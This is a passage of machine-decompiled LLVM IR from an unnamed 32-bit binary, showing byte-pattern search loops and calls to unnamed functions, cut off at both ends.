  %v5_804e14c = call i32 @function_805232c(i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e14c, i32* %eax.global-to-local, align 4
  %v0_804e151 = load i32, i32* @esp, align 4
  store i32 %v5_804e14c, i32* @ebx, align 4
  %tmp113 = icmp slt i32 %v5_804e14c, 1
  br i1 %tmp113, label %dec_label_pc_804e347, label %dec_label_pc_804e15e

dec_label_pc_804e15e:                             ; preds = %dec_label_pc_804e13c
  %v1_804e151 = add i32 %v0_804e151, 16
  %v1_804e15e = add i32 %v0_804e151, 8436
  %v2_804e15e = inttoptr i32 %v1_804e15e to i32*
  %v3_804e15e = load i32, i32* %v2_804e15e, align 4
  store i32 %v3_804e15e, i32* %eax.global-to-local, align 4
  %v2_804e165 = inttoptr i32 %v1_804e151 to i32*
  store i32 %v3_804e15e, i32* %v2_804e165, align 4
  %v0_804e168 = load i32, i32* @ebx, align 4
  %v1_804e168 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e168 = sub i32 %v0_804e168, %v1_804e168
  %v8_804e168 = xor i32 %v1_804e168, %v0_804e168
  %v9_804e168 = xor i32 %v2_804e168, %v0_804e168
  %v10_804e168 = and i32 %v9_804e168, %v8_804e168
  %v11_804e168 = icmp slt i32 %v10_804e168, 0
  %v13_804e168 = icmp slt i32 %v2_804e168, 0
  %v2_804e16a = icmp eq i1 %v13_804e168, %v11_804e168
  br i1 %v2_804e16a, label %dec_label_pc_804e16c, label %dec_label_pc_804e15e.dec_label_pc_804e198_crit_edge

dec_label_pc_804e15e.dec_label_pc_804e198_crit_edge: ; preds = %dec_label_pc_804e15e
  %v0_804e198.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e198

dec_label_pc_804e16c:                             ; preds = %dec_label_pc_804e15e
  %v0_804e171 = load i32, i32* @esp, align 4
  %v10_804e175 = icmp eq i32 %v0_804e168, 0
  br i1 %v10_804e175, label %dec_label_pc_804e198, label %dec_label_pc_804e180.preheader

dec_label_pc_804e180.preheader:                   ; preds = %dec_label_pc_804e16c
  %v1_804e171 = add i32 %v0_804e171, 56
  %v1_804e180 = add i32 %v0_804e171, 36
  %v2_804e180 = inttoptr i32 %v1_804e180 to i32*
  %v1_804e271 = inttoptr i32 %v0_804e171 to i32*
  br label %dec_label_pc_804e180

dec_label_pc_804e180:                             ; preds = %dec_label_pc_804e180.preheader, %dec_label_pc_804e191
  %v0_804e191.in = phi i32 [ %v0_804e191, %dec_label_pc_804e191 ], [ %v0_804e168, %dec_label_pc_804e180.preheader ]
  %v0_804e270 = phi i32 [ %v3_804e18660, %dec_label_pc_804e191 ], [ 0, %dec_label_pc_804e180.preheader ]
  %v4_804e184 = phi i32 [ %v6_804e184, %dec_label_pc_804e191 ], [ %v1_804e168, %dec_label_pc_804e180.preheader ]
  %v0_804e192 = phi i32 [ %v1_804e192, %dec_label_pc_804e191 ], [ %v1_804e171, %dec_label_pc_804e180.preheader ]
  %v0_804e191 = add i32 %v0_804e191.in, -1
  %v3_804e180 = load i32, i32* %v2_804e180, align 4
  store i32 %v3_804e180, i32* @edi, align 4
  %v1_804e184 = inttoptr i32 %v0_804e192 to i8*
  %v2_804e184 = load i8, i8* %v1_804e184, align 1
  %v3_804e184 = zext i8 %v2_804e184 to i32
  %v5_804e184 = and i32 %v4_804e184, -256
  %v6_804e184 = or i32 %v3_804e184, %v5_804e184
  store i32 %v6_804e184, i32* %eax.global-to-local, align 4
  %v4_804e186 = add i32 %v3_804e180, %v0_804e270
  %v5_804e186 = inttoptr i32 %v4_804e186 to i8*
  %v6_804e186 = load i8, i8* %v5_804e186, align 1
  %v17_804e186 = icmp eq i8 %v2_804e184, %v6_804e186
  br i1 %v17_804e186, label %dec_label_pc_804e270, label %dec_label_pc_804e18f

dec_label_pc_804e18f:                             ; preds = %dec_label_pc_804e180
  br label %dec_label_pc_804e191

dec_label_pc_804e191:                             ; preds = %dec_label_pc_804e270, %dec_label_pc_804e18f
  %v3_804e18660 = phi i32 [ %v1_804e270, %dec_label_pc_804e270 ], [ 0, %dec_label_pc_804e18f ]
  %v1_804e192 = add i32 %v0_804e192, 1
  %v10_804e193 = icmp eq i32 %v0_804e191, 0
  %v1_804e196 = icmp eq i1 %v10_804e193, false
  br i1 %v1_804e196, label %dec_label_pc_804e180, label %dec_label_pc_804e198

dec_label_pc_804e198:                             ; preds = %dec_label_pc_804e191, %dec_label_pc_804e15e.dec_label_pc_804e198_crit_edge, %dec_label_pc_804e16c
  %v0_804e198 = phi i32 [ %v0_804e198.pre, %dec_label_pc_804e15e.dec_label_pc_804e198_crit_edge ], [ %v0_804e171, %dec_label_pc_804e16c ], [ %v0_804e171, %dec_label_pc_804e191 ]
  %v1_804e198 = add i32 %v0_804e198, 8416
  %v2_804e198 = inttoptr i32 %v1_804e198 to i32*
  %v3_804e198 = load i32, i32* %v2_804e198, align 4
  store i32 %v3_804e198, i32* %eax.global-to-local, align 4
  %v2_804e19f = inttoptr i32 %v0_804e198 to i32*
  store i32 %v3_804e198, i32* %v2_804e19f, align 4
  %v0_804e1a2 = load i32, i32* @ebx, align 4
  %v1_804e1a2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1a2 = sub i32 %v0_804e1a2, %v1_804e1a2
  %v8_804e1a2 = xor i32 %v1_804e1a2, %v0_804e1a2
  %v9_804e1a2 = xor i32 %v2_804e1a2, %v0_804e1a2
  %v10_804e1a2 = and i32 %v9_804e1a2, %v8_804e1a2
  %v11_804e1a2 = icmp slt i32 %v10_804e1a2, 0
  %v13_804e1a2 = icmp slt i32 %v2_804e1a2, 0
  %v2_804e1a4 = icmp eq i1 %v13_804e1a2, %v11_804e1a2
  br i1 %v2_804e1a4, label %dec_label_pc_804e1a6, label %dec_label_pc_804e198.dec_label_pc_804e1cc_crit_edge

dec_label_pc_804e198.dec_label_pc_804e1cc_crit_edge: ; preds = %dec_label_pc_804e198
  %v0_804e1cc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e1cc

dec_label_pc_804e1a6:                             ; preds = %dec_label_pc_804e198
  %v0_804e1ab = load i32, i32* @esp, align 4
  %v10_804e1af = icmp eq i32 %v0_804e1a2, 0
  br i1 %v10_804e1af, label %dec_label_pc_804e1cc, label %dec_label_pc_804e1b4.preheader

dec_label_pc_804e1b4.preheader:                   ; preds = %dec_label_pc_804e1a6
  %v1_804e1ab = add i32 %v0_804e1ab, 56
  %v1_804e1b4 = add i32 %v0_804e1ab, 32
  %v2_804e1b4 = inttoptr i32 %v1_804e1b4 to i32*
  %v1_804e309 = inttoptr i32 %v0_804e1ab to i32*
  br label %dec_label_pc_804e1b4

dec_label_pc_804e1b4:                             ; preds = %dec_label_pc_804e1b4.preheader, %dec_label_pc_804e1c6
  %v0_804e1c6.in = phi i32 [ %v0_804e1c6, %dec_label_pc_804e1c6 ], [ %v0_804e1a2, %dec_label_pc_804e1b4.preheader ]
  %v0_804e308 = phi i32 [ %v3_804e1ba68, %dec_label_pc_804e1c6 ], [ 0, %dec_label_pc_804e1b4.preheader ]
  %v4_804e1b8 = phi i32 [ %v6_804e1b8, %dec_label_pc_804e1c6 ], [ %v1_804e1a2, %dec_label_pc_804e1b4.preheader ]
  %v0_804e312 = phi i32 [ %v1_804e1c5, %dec_label_pc_804e1c6 ], [ %v1_804e1ab, %dec_label_pc_804e1b4.preheader ]
  %v0_804e1c6 = add i32 %v0_804e1c6.in, -1
  %v3_804e1b4 = load i32, i32* %v2_804e1b4, align 4
  store i32 %v3_804e1b4, i32* @edi, align 4
  %v1_804e1b8 = inttoptr i32 %v0_804e312 to i8*
  %v2_804e1b8 = load i8, i8* %v1_804e1b8, align 1
  %v3_804e1b8 = zext i8 %v2_804e1b8 to i32
  %v5_804e1b8 = and i32 %v4_804e1b8, -256
  %v6_804e1b8 = or i32 %v3_804e1b8, %v5_804e1b8
  store i32 %v6_804e1b8, i32* %eax.global-to-local, align 4
  %v4_804e1ba = add i32 %v3_804e1b4, %v0_804e308
  %v5_804e1ba = inttoptr i32 %v4_804e1ba to i8*
  %v6_804e1ba = load i8, i8* %v5_804e1ba, align 1
  %v17_804e1ba = icmp eq i8 %v2_804e1b8, %v6_804e1ba
  br i1 %v17_804e1ba, label %dec_label_pc_804e308, label %dec_label_pc_804e1c3

dec_label_pc_804e1c3:                             ; preds = %dec_label_pc_804e1b4
  br label %dec_label_pc_804e1c6

dec_label_pc_804e1c6:                             ; preds = %dec_label_pc_804e308, %dec_label_pc_804e1c3
  %v3_804e1ba68 = phi i32 [ 0, %dec_label_pc_804e1c3 ], [ %v1_804e308, %dec_label_pc_804e308 ]
  %v1_804e1c5 = add i32 %v0_804e312, 1
  %v10_804e1c7 = icmp eq i32 %v0_804e1c6, 0
  %v1_804e1ca = icmp eq i1 %v10_804e1c7, false
  br i1 %v1_804e1ca, label %dec_label_pc_804e1b4, label %dec_label_pc_804e1cc

dec_label_pc_804e1cc:                             ; preds = %dec_label_pc_804e1c6, %dec_label_pc_804e198.dec_label_pc_804e1cc_crit_edge, %dec_label_pc_804e1a6
  %v0_804e1cc = phi i32 [ %v0_804e1cc.pre, %dec_label_pc_804e198.dec_label_pc_804e1cc_crit_edge ], [ %v0_804e1ab, %dec_label_pc_804e1a6 ], [ %v0_804e1ab, %dec_label_pc_804e1c6 ]
  %v1_804e1cc = add i32 %v0_804e1cc, 8412
  %v2_804e1cc = inttoptr i32 %v1_804e1cc to i32*
  %v3_804e1cc = load i32, i32* %v2_804e1cc, align 4
  store i32 %v3_804e1cc, i32* %eax.global-to-local, align 4
  %v2_804e1d3 = inttoptr i32 %v0_804e1cc to i32*
  store i32 %v3_804e1cc, i32* %v2_804e1d3, align 4
  %v0_804e1d6 = load i32, i32* @ebx, align 4
  %v1_804e1d6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e1d6 = sub i32 %v0_804e1d6, %v1_804e1d6
  %v8_804e1d6 = xor i32 %v1_804e1d6, %v0_804e1d6
  %v9_804e1d6 = xor i32 %v2_804e1d6, %v0_804e1d6
  %v10_804e1d6 = and i32 %v9_804e1d6, %v8_804e1d6
  %v11_804e1d6 = icmp slt i32 %v10_804e1d6, 0
  %v13_804e1d6 = icmp slt i32 %v2_804e1d6, 0
  %v2_804e1d8 = icmp eq i1 %v13_804e1d6, %v11_804e1d6
  br i1 %v2_804e1d8, label %dec_label_pc_804e1da, label %dec_label_pc_804e1cc.dec_label_pc_804e200_crit_edge

dec_label_pc_804e1cc.dec_label_pc_804e200_crit_edge: ; preds = %dec_label_pc_804e1cc
  %v0_804e200.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e200

dec_label_pc_804e1da:                             ; preds = %dec_label_pc_804e1cc
  %v0_804e1df = load i32, i32* @esp, align 4
  %v10_804e1e3 = icmp eq i32 %v0_804e1d6, 0
  br i1 %v10_804e1e3, label %dec_label_pc_804e200, label %dec_label_pc_804e1e8.preheader

dec_label_pc_804e1e8.preheader:                   ; preds = %dec_label_pc_804e1da
  %v1_804e1df = add i32 %v0_804e1df, 56
  %v1_804e1e8 = add i32 %v0_804e1df, 28
  %v2_804e1e8 = inttoptr i32 %v1_804e1e8 to i32*
  %v1_804e319 = inttoptr i32 %v0_804e1df to i32*
  br label %dec_label_pc_804e1e8

dec_label_pc_804e1e8:                             ; preds = %dec_label_pc_804e1e8.preheader, %dec_label_pc_804e1fa
  %v0_804e1fa.in = phi i32 [ %v0_804e1fa, %dec_label_pc_804e1fa ], [ %v0_804e1d6, %dec_label_pc_804e1e8.preheader ]
  %v0_804e318 = phi i32 [ %v3_804e1ee76, %dec_label_pc_804e1fa ], [ 0, %dec_label_pc_804e1e8.preheader ]
  %v4_804e1ec = phi i32 [ %v6_804e1ec, %dec_label_pc_804e1fa ], [ %v1_804e1d6, %dec_label_pc_804e1e8.preheader ]
  %v0_804e322 = phi i32 [ %v1_804e1f9, %dec_label_pc_804e1fa ], [ %v1_804e1df, %dec_label_pc_804e1e8.preheader ]
  %v0_804e1fa = add i32 %v0_804e1fa.in, -1
  %v3_804e1e8 = load i32, i32* %v2_804e1e8, align 4
  store i32 %v3_804e1e8, i32* @edi, align 4
  %v1_804e1ec = inttoptr i32 %v0_804e322 to i8*
  %v2_804e1ec = load i8, i8* %v1_804e1ec, align 1
  %v3_804e1ec = zext i8 %v2_804e1ec to i32
  %v5_804e1ec = and i32 %v4_804e1ec, -256
  %v6_804e1ec = or i32 %v3_804e1ec, %v5_804e1ec
  store i32 %v6_804e1ec, i32* %eax.global-to-local, align 4
  %v4_804e1ee = add i32 %v3_804e1e8, %v0_804e318
  %v5_804e1ee = inttoptr i32 %v4_804e1ee to i8*
  %v6_804e1ee = load i8, i8* %v5_804e1ee, align 1
  %v17_804e1ee = icmp eq i8 %v2_804e1ec, %v6_804e1ee
  br i1 %v17_804e1ee, label %dec_label_pc_804e318, label %dec_label_pc_804e1f7

dec_label_pc_804e1f7:                             ; preds = %dec_label_pc_804e1e8
  br label %dec_label_pc_804e1fa

dec_label_pc_804e1fa:                             ; preds = %dec_label_pc_804e318, %dec_label_pc_804e1f7
  %v3_804e1ee76 = phi i32 [ 0, %dec_label_pc_804e1f7 ], [ %v1_804e318, %dec_label_pc_804e318 ]
  %v1_804e1f9 = add i32 %v0_804e322, 1
  %v10_804e1fb = icmp eq i32 %v0_804e1fa, 0
  %v1_804e1fe = icmp eq i1 %v10_804e1fb, false
  br i1 %v1_804e1fe, label %dec_label_pc_804e1e8, label %dec_label_pc_804e200

dec_label_pc_804e200:                             ; preds = %dec_label_pc_804e1fa, %dec_label_pc_804e1cc.dec_label_pc_804e200_crit_edge, %dec_label_pc_804e1da
  %v0_804e200 = phi i32 [ %v0_804e200.pre, %dec_label_pc_804e1cc.dec_label_pc_804e200_crit_edge ], [ %v0_804e1df, %dec_label_pc_804e1da ], [ %v0_804e1df, %dec_label_pc_804e1fa ]
  %v1_804e200 = add i32 %v0_804e200, 8424
  %v2_804e200 = inttoptr i32 %v1_804e200 to i32*
  %v3_804e200 = load i32, i32* %v2_804e200, align 4
  store i32 %v3_804e200, i32* %eax.global-to-local, align 4
  %v2_804e207 = inttoptr i32 %v0_804e200 to i32*
  store i32 %v3_804e200, i32* %v2_804e207, align 4
  %v0_804e20a = load i32, i32* @ebx, align 4
  %v1_804e20a = load i32, i32* %eax.global-to-local, align 4
  %v2_804e20a = sub i32 %v0_804e20a, %v1_804e20a
  %v8_804e20a = xor i32 %v1_804e20a, %v0_804e20a
  %v9_804e20a = xor i32 %v2_804e20a, %v0_804e20a
  %v10_804e20a = and i32 %v9_804e20a, %v8_804e20a
  %v11_804e20a = icmp slt i32 %v10_804e20a, 0
  %v13_804e20a = icmp slt i32 %v2_804e20a, 0
  %v2_804e20c = icmp eq i1 %v13_804e20a, %v11_804e20a
  br i1 %v2_804e20c, label %dec_label_pc_804e20e, label %dec_label_pc_804e200.dec_label_pc_804e238_crit_edge

dec_label_pc_804e200.dec_label_pc_804e238_crit_edge: ; preds = %dec_label_pc_804e200
  %v0_804e238.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e238

dec_label_pc_804e20e:                             ; preds = %dec_label_pc_804e200
  %v0_804e213 = load i32, i32* @esp, align 4
  %v10_804e217 = icmp eq i32 %v0_804e20a, 0
  br i1 %v10_804e217, label %dec_label_pc_804e238, label %dec_label_pc_804e220.preheader

dec_label_pc_804e220.preheader:                   ; preds = %dec_label_pc_804e20e
  %v1_804e213 = add i32 %v0_804e213, 56
  %v1_804e220 = add i32 %v0_804e213, 24
  %v2_804e220 = inttoptr i32 %v1_804e220 to i32*
  %v1_804e329 = inttoptr i32 %v0_804e213 to i32*
  br label %dec_label_pc_804e220

dec_label_pc_804e220:                             ; preds = %dec_label_pc_804e220.preheader, %dec_label_pc_804e232
  %v0_804e232.in = phi i32 [ %v0_804e232, %dec_label_pc_804e232 ], [ %v0_804e20a, %dec_label_pc_804e220.preheader ]
  %v0_804e328 = phi i32 [ %v3_804e22684, %dec_label_pc_804e232 ], [ 0, %dec_label_pc_804e220.preheader ]
  %v4_804e224 = phi i32 [ %v6_804e224, %dec_label_pc_804e232 ], [ %v1_804e20a, %dec_label_pc_804e220.preheader ]
  %v0_804e332 = phi i32 [ %v1_804e231, %dec_label_pc_804e232 ], [ %v1_804e213, %dec_label_pc_804e220.preheader ]
  %v0_804e232 = add i32 %v0_804e232.in, -1
  %v3_804e220 = load i32, i32* %v2_804e220, align 4
  store i32 %v3_804e220, i32* @edi, align 4
  %v1_804e224 = inttoptr i32 %v0_804e332 to i8*
  %v2_804e224 = load i8, i8* %v1_804e224, align 1
  %v3_804e224 = zext i8 %v2_804e224 to i32
  %v5_804e224 = and i32 %v4_804e224, -256
  %v6_804e224 = or i32 %v3_804e224, %v5_804e224
  store i32 %v6_804e224, i32* %eax.global-to-local, align 4
  %v4_804e226 = add i32 %v3_804e220, %v0_804e328
  %v5_804e226 = inttoptr i32 %v4_804e226 to i8*
  %v6_804e226 = load i8, i8* %v5_804e226, align 1
  %v17_804e226 = icmp eq i8 %v2_804e224, %v6_804e226
  br i1 %v17_804e226, label %dec_label_pc_804e328, label %dec_label_pc_804e22f

dec_label_pc_804e22f:                             ; preds = %dec_label_pc_804e220
  br label %dec_label_pc_804e232

dec_label_pc_804e232:                             ; preds = %dec_label_pc_804e328, %dec_label_pc_804e22f
  %v3_804e22684 = phi i32 [ 0, %dec_label_pc_804e22f ], [ %v1_804e328, %dec_label_pc_804e328 ]
  %v1_804e231 = add i32 %v0_804e332, 1
  %v10_804e233 = icmp eq i32 %v0_804e232, 0
  %v1_804e236 = icmp eq i1 %v10_804e233, false
  br i1 %v1_804e236, label %dec_label_pc_804e220, label %dec_label_pc_804e238

dec_label_pc_804e238:                             ; preds = %dec_label_pc_804e232, %dec_label_pc_804e200.dec_label_pc_804e238_crit_edge, %dec_label_pc_804e20e
  %v0_804e247 = phi i32 [ %v0_804e238.pre, %dec_label_pc_804e200.dec_label_pc_804e238_crit_edge ], [ %v0_804e213, %dec_label_pc_804e20e ], [ %v0_804e213, %dec_label_pc_804e232 ]
  %v0_804e13c51 = phi i32 [ %v1_804e20a, %dec_label_pc_804e200.dec_label_pc_804e238_crit_edge ], [ %v1_804e20a, %dec_label_pc_804e20e ], [ %v6_804e224, %dec_label_pc_804e232 ]
  %v1_804e238 = add i32 %v0_804e247, 8408
  %v2_804e238 = inttoptr i32 %v1_804e238 to i32*
  %v3_804e238 = load i32, i32* %v2_804e238, align 4
  %v2_804e23f = sub i32 %v0_804e20a, %v3_804e238
  %v8_804e23f = xor i32 %v3_804e238, %v0_804e20a
  %v9_804e23f = xor i32 %v2_804e23f, %v0_804e20a
  %v10_804e23f = and i32 %v9_804e23f, %v8_804e23f
  %v11_804e23f = icmp slt i32 %v10_804e23f, 0
  %v13_804e23f = icmp slt i32 %v2_804e23f, 0
  %v2_804e241 = icmp eq i1 %v13_804e23f, %v11_804e23f
  br i1 %v2_804e241, label %dec_label_pc_804e247, label %dec_label_pc_804e13c

dec_label_pc_804e247:                             ; preds = %dec_label_pc_804e238
  %v1_804e250125 = add i32 %v0_804e20a, -1
  store i32 %v1_804e250125, i32* @ebx, align 4
  %v10_804e251126 = icmp eq i32 %v0_804e20a, 0
  br i1 %v10_804e251126, label %dec_label_pc_804e13c, label %dec_label_pc_804e25a.lr.ph

dec_label_pc_804e25a.lr.ph:                       ; preds = %dec_label_pc_804e247
  %v1_804e247 = add i32 %v0_804e247, 56
  %v1_804e25a = add i32 %v0_804e247, 20
  %v2_804e25a = inttoptr i32 %v1_804e25a to i32*
  br label %dec_label_pc_804e25a

dec_label_pc_804e25a:                             ; preds = %dec_label_pc_804e25a.lr.ph, %dec_label_pc_804e250.backedge
  %v1_804e250130 = phi i32 [ %v1_804e250125, %dec_label_pc_804e25a.lr.ph ], [ %v1_804e250, %dec_label_pc_804e250.backedge ]
  %v4_804e25e129 = phi i32 [ %v0_804e13c51, %dec_label_pc_804e25a.lr.ph ], [ %v6_804e25e, %dec_label_pc_804e250.backedge ]
  %v0_804e341128 = phi i32 [ %v1_804e247, %dec_label_pc_804e25a.lr.ph ], [ %storemerge32.in, %dec_label_pc_804e250.backedge ]
  %v0_804e338127 = phi i32 [ 0, %dec_label_pc_804e25a.lr.ph ], [ %v3_804e26090, %dec_label_pc_804e250.backedge ]
  %v3_804e25a = load i32, i32* %v2_804e25a, align 4
  store i32 %v3_804e25a, i32* @edi, align 4
  %v1_804e25e = inttoptr i32 %v0_804e341128 to i8*
  %v2_804e25e = load i8, i8* %v1_804e25e, align 1
  %v3_804e25e = zext i8 %v2_804e25e to i32
  %v5_804e25e = and i32 %v4_804e25e129, -256
  %v6_804e25e = or i32 %v3_804e25e, %v5_804e25e
  store i32 %v6_804e25e, i32* %eax.global-to-local, align 4
  %v4_804e260 = add i32 %v3_804e25a, %v0_804e338127
  %v5_804e260 = inttoptr i32 %v4_804e260 to i8*
  %v6_804e260 = load i8, i8* %v5_804e260, align 1
  %v17_804e260 = icmp eq i8 %v2_804e25e, %v6_804e260
  br i1 %v17_804e260, label %dec_label_pc_804e338, label %dec_label_pc_804e269

dec_label_pc_804e269:                             ; preds = %dec_label_pc_804e25a
  br label %dec_label_pc_804e250.backedge

dec_label_pc_804e250.backedge:                    ; preds = %dec_label_pc_804e338, %dec_label_pc_804e269
  %v3_804e26090 = phi i32 [ 0, %dec_label_pc_804e269 ], [ %v1_804e338, %dec_label_pc_804e338 ]
  %storemerge32.in = add i32 %v0_804e341128, 1
  %v1_804e250 = add i32 %v1_804e250130, -1
  store i32 %v1_804e250, i32* @ebx, align 4
  %v10_804e251 = icmp eq i32 %v1_804e250130, 0
  br i1 %v10_804e251, label %dec_label_pc_804e13c, label %dec_label_pc_804e25a

dec_label_pc_804e270:                             ; preds = %dec_label_pc_804e180
  %v1_804e270 = add i32 %v0_804e270, 1
  %v2_804e271 = load i32, i32* %v1_804e271, align 4
  %v14_804e271 = icmp eq i32 %v2_804e271, %v1_804e270
  %v1_804e274 = icmp eq i1 %v14_804e271, false
  br i1 %v1_804e274, label %dec_label_pc_804e191, label %dec_label_pc_804e27a

dec_label_pc_804e27a:                             ; preds = %dec_label_pc_804e270, %dec_label_pc_804e308, %dec_label_pc_804e318, %dec_label_pc_804e328, %dec_label_pc_804e338
  %v0_804e27a = phi i32 [ %v0_804e247, %dec_label_pc_804e338 ], [ %v0_804e213, %dec_label_pc_804e328 ], [ %v0_804e1df, %dec_label_pc_804e318 ], [ %v0_804e1ab, %dec_label_pc_804e308 ], [ %v0_804e171, %dec_label_pc_804e270 ]
  %v1_804e27d = add i32 %v0_804e27a, -16
  %v2_804e27d = inttoptr i32 %v1_804e27d to i32*
  store i32 12, i32* %v2_804e27d, align 4
  %v2_804e27f = call i32 @function_8051220(i8 0)
  store i32 %v2_804e27f, i32* %eax.global-to-local, align 4
  %v0_804e284 = load i32, i32* @esp, align 4
  %v1_804e284 = inttoptr i32 %v0_804e284 to i32*
  store i32 13, i32* %v1_804e284, align 4
  %v2_804e28b = call i32 @function_8051220(i8 0)
  store i32 %v2_804e28b, i32* %eax.global-to-local, align 4
  %v0_804e290 = load i32, i32* @esp, align 4
  %v1_804e290 = inttoptr i32 %v0_804e290 to i32*
  store i32 14, i32* %v1_804e290, align 4
  %v2_804e297 = call i32 @function_8051220(i8 0)
  store i32 %v2_804e297, i32* %eax.global-to-local, align 4
  %v0_804e29c = load i32, i32* @esp, align 4
  %v1_804e29c = inttoptr i32 %v0_804e29c to i32*
  store i32 15, i32* %v1_804e29c, align 4
  %v2_804e2a3 = call i32 @function_8051220(i8 0)
  store i32 %v2_804e2a3, i32* %eax.global-to-local, align 4
  %v0_804e2a8 = load i32, i32* @esp, align 4
  %v1_804e2a8 = inttoptr i32 %v0_804e2a8 to i32*
  store i32 16, i32* %v1_804e2a8, align 4
  %v2_804e2af = call i32 @function_8051220(i8 0)
  store i32 %v2_804e2af, i32* %eax.global-to-local, align 4
  %v0_804e2b4 = load i32, i32* @esp, align 4
  %v1_804e2b4 = inttoptr i32 %v0_804e2b4 to i32*
  %v2_804e2b4 = load i32, i32* %v1_804e2b4, align 4
  store i32 %v2_804e2b4, i32* %eax.global-to-local, align 4
  %v1_804e2b5 = add i32 %v0_804e2b4, 56
  %v2_804e2b5 = inttoptr i32 %v1_804e2b5 to i32*
  %v3_804e2b5 = load i32, i32* %v2_804e2b5, align 4
  store i32 %v3_804e2b5, i32* @edi, align 4
  store i32 %v3_804e2b5, i32* %v1_804e2b4, align 4
  %v1_804e2ba = call i32 @function_8052191(i32 0)
  store i32 %v1_804e2ba, i32* %eax.global-to-local, align 4
  %v0_804e2bf = load i32, i32* @esp, align 4
  %v1_804e2bf = inttoptr i32 %v0_804e2bf to i32*
  %v2_804e2bf = load i32, i32* %v1_804e2bf, align 4
  store i32 %v2_804e2bf, i32* @ebx, align 4
  %v3_804e2bf = add i32 %v0_804e2bf, 4
  %v1_804e2c0 = inttoptr i32 %v3_804e2bf to i32*
  store i32 9, i32* %v1_804e2c0, align 4
  %v0_804e2c3 = load i32, i32* @ebp, align 4
  store i32 %v0_804e2c3, i32* %v1_804e2bf, align 4
  %v4_804e2c4 = call i32 @function_8052270(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e2c4, i32* @eax, align 4
  %v0_804e2c9 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e2cc

dec_label_pc_804e2cc:                             ; preds = %dec_label_pc_804e077, %dec_label_pc_804e347, %dec_label_pc_804e27a
  %v1_804e2cc.in = phi i32 [ %v0_804e08c, %dec_label_pc_804e077 ], [ %v0_804e38c, %dec_label_pc_804e347 ], [ %v0_804e2c9, %dec_label_pc_804e27a ]
  %v0_804e2cc = load i32, i32* @ecx, align 4
  %v2_804e2cc = add i32 %v1_804e2cc.in, 12
  %v3_804e2cc = inttoptr i32 %v2_804e2cc to i32*
  store i32 %v0_804e2cc, i32* %v3_804e2cc, align 4
  %v0_804e2cd = load i32, i32* @ecx, align 4
  %v2_804e2cd = add i32 %v1_804e2cc.in, 8
  %v3_804e2cd = inttoptr i32 %v2_804e2cd to i32*
  store i32 %v0_804e2cd, i32* %v3_804e2cd, align 4
  %v1_804e2ce = add i32 %v1_804e2cc.in, 4
  %v2_804e2ce = inttoptr i32 %v1_804e2ce to i32*
  store i32 64, i32* %v2_804e2ce, align 4
  %v0_804e2d0 = load i32, i32* @ebp, align 4
  store i32 %v0_804e2d0, i32* @esi, align 4
  %v1_804e2d2 = add i32 %v1_804e2cc.in, 8328
  store i32 %v1_804e2d2, i32* @edi, align 4
  %v3_804e2d9 = inttoptr i32 %v1_804e2cc.in to i32*
  store i32 %v1_804e2d2, i32* %v3_804e2d9, align 4
  %v2_804e2da = call i32 @function_8051c80(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e2da, i32* %eax.global-to-local, align 4
  %v0_804e2df = load i32, i32* @esp, align 4
  %v1_804e2df = inttoptr i32 %v0_804e2df to i32*
  %v2_804e2df = load i32, i32* %v1_804e2df, align 4
  store i32 %v2_804e2df, i32* %eax.global-to-local, align 4
  %v3_804e2df = add i32 %v0_804e2df, 4
  %v1_804e2e0 = inttoptr i32 %v3_804e2df to i32*
  store i32 64, i32* %v1_804e2e0, align 4
  %v1_804e2e3 = add i32 %v0_804e2df, 8264
  store i32 %v1_804e2e3, i32* @eax, align 4
  store i32 %v1_804e2e3, i32* %v1_804e2df, align 4
  %v2_804e2eb = call i32 @function_8051c80(i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_804e2eb, i32* %eax.global-to-local, align 4
  %v0_804e2f0 = load i32, i32* @esp, align 4
  %v1_804e2f0 = inttoptr i32 %v0_804e2f0 to i32*
  store i32 1, i32* %v1_804e2f0, align 4
  %v1_804e2f7 = call i32 @function_8053d40(i32 0)
  store i32 %v1_804e2f7, i32* %eax.global-to-local, align 4
  %v0_804e2fc = load i32, i32* @esp, align 4
  %v1_804e2fc = add i32 %v0_804e2fc, 24
  %v2_804e2fc = inttoptr i32 %v1_804e2fc to i32*
  %v3_804e2fc = load i32, i32* %v2_804e2fc, align 4
  store i32 %v3_804e2fc, i32* @ebx, align 4
  %v1_804e300 = add i32 %v0_804e2fc, 16
  br label %dec_label_pc_804de00

dec_label_pc_804e308:                             ; preds = %dec_label_pc_804e1b4
  %v1_804e308 = add i32 %v0_804e308, 1
  %v2_804e309 = load i32, i32* %v1_804e309, align 4
  %v14_804e309 = icmp eq i32 %v2_804e309, %v1_804e308
  br i1 %v14_804e309, label %dec_label_pc_804e27a, label %dec_label_pc_804e1c6

dec_label_pc_804e318:                             ; preds = %dec_label_pc_804e1e8
  %v1_804e318 = add i32 %v0_804e318, 1
  %v2_804e319 = load i32, i32* %v1_804e319, align 4
  %v14_804e319 = icmp eq i32 %v2_804e319, %v1_804e318
  br i1 %v14_804e319, label %dec_label_pc_804e27a, label %dec_label_pc_804e1fa

dec_label_pc_804e328:                             ; preds = %dec_label_pc_804e220
  %v1_804e328 = add i32 %v0_804e328, 1
  %v2_804e329 = load i32, i32* %v1_804e329, align 4
  %v14_804e329 = icmp eq i32 %v2_804e329, %v1_804e328
  br i1 %v14_804e329, label %dec_label_pc_804e27a, label %dec_label_pc_804e232

dec_label_pc_804e338:                             ; preds = %dec_label_pc_804e25a
  %v1_804e338 = add i32 %v0_804e338127, 1
  %v12_804e339 = icmp eq i32 %v3_804e238, %v1_804e338
  br i1 %v12_804e339, label %dec_label_pc_804e27a, label %dec_label_pc_804e250.backedge

dec_label_pc_804e347:                             ; preds = %dec_label_pc_804e13c
